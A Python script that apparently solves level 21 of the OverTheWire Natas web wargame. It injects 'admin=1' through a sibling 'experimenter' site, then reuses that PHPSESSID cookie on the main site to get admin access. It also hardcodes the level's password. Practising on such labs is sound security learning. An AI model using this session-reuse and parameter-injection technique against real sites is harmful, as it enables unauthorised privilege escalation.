#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re

username = 'natas21'
password = '89OWrTkGmiLZLv12JY4tLj2c4FW0xn56'

url = 'http://%s.natas.labs.overthewire.org/' % username
experimenter = 'http://natas21-experimenter.natas.labs.overthewire.org/?debug=true&submit=1&admin=1'


session = requests.Session()


# response = session.post(url, auth = (username, password) )
# content = response.text

response = session.post(experimenter, auth = (username, password) )
content = response.text
print(content)
old_session = session.cookies["PHPSESSID"]

response = session.get(url, cookies = {"PHPSESSID" : old_session}, auth = (username, password) )
content = response.text
print(content)
